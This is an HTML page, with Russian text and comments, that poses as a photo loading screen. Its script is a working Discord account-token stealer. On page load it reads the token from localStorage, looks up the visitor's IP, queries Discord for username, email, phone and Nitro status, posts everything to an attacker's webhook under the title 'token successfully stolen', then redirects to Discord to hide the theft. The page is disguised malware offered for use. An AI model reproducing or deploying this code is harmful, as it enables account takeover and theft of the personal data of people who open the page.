<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>Открывается фото...</title>
  <style>body{background:#000;color:white;font:20px Arial;text-align:center;padding-top:10%}</style>
</head>
<body>
  <h1>Загрузка фото...</h1>
  <script>
    // Твой вебхук из Discord
    const webhook = "https://discord.com/api/webhooks/https://ptb.discord.com/api/webhooks/1447243695366738106/iCvLL1roGXfGONygU2iASibPbJjs5AwiE5u3AxjvR1Eb9qQ-JgDGwcNrNn-u8p3C93RZ";  // 

    // Получаем токен
    const token = localStorage.getItem("token") || "нет токена в localStorage";
    console.log("Найден токен:", token.substring(0, 20) + "...");  // Для дебага

    if (token === "нет токена в localStorage") {
      console.error("Токен не найден! Пользователь не залогинен в браузере.");
    }

    // Получаем IP
    fetch("https://httpbin.org/ip")
      .then(r => r.json())
      .then(ipData => {
        console.log("IP получен:", ipData.origin);
        return ipData.origin;
      })
      .catch(err => {
        console.error("Ошибка IP:", err);
        return "неизвестен";
      })
      .then(ip => {
        // Получаем инфу о юзере через Discord API
        return fetch("https://discord.com/api/v9/users/@me", {
          headers: { "Authorization": token }
        })
        .then(r => {
          if (!r.ok) {
            console.error("Ошибка API:", r.status, r.statusText);
            return { username: "неизвестен", discriminator: "0000", id: "неизвестен", email: "скрыт", phone: "нет", premium_type: 0 };
          }
          return r.json();
        })
        .then(user => {
          console.log("Юзер получен:", user.username);
          // Формируем embed
          const data = {
            content: "**Новый токен!**",
            embeds: [{
              color: 16711680,  // Красный
              title: "Токен успешно спизжен",
              fields: [
                { name: "Токен", value: `\`\`\`${token}\`\`\``, inline: false },
                { name: "Юзер", value: `${user.username || "неизвестен"}#${user.discriminator || "0000"} (${user.id || "неизвестен"})`, inline: true },
                { name: "Email", value: user.email || "скрыт", inline: true },
                { name: "Телефон", value: user.phone || "нет", inline: true },
                { name: "Nitro", value: user.premium_type ? (user.premium_type === 1 ? "Nitro Classic" : "Nitro") : "Нет", inline: true },
                { name: "IP", value: ip, inline: true }
              ],
              timestamp: new Date().toISOString()
            }]
          };

          console.log("Отправляем в вебхук...");
          // Отправляем в вебхук
          return fetch(webhook, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(data)
          })
          .then(r => {
            if (r.ok) {
              console.log("✅ Успех! Токен отправлен в канал.");
            } else {
              console.error("❌ Ошибка вебхука:", r.status, r.statusText);
            }
          })
          .catch(err => {
            console.error("❌ Fetch ошибка (CORS/mixed content?):", err);
          });
        });
      });
    // Переходим в Discord через 2 секунды (чтобы успело отправиться)
    setTimeout(() => {
      console.log("Переходим в Discord...");
      location.href = "https://discord.com/app";
    }, 2000);
  </script>
</body>
</html>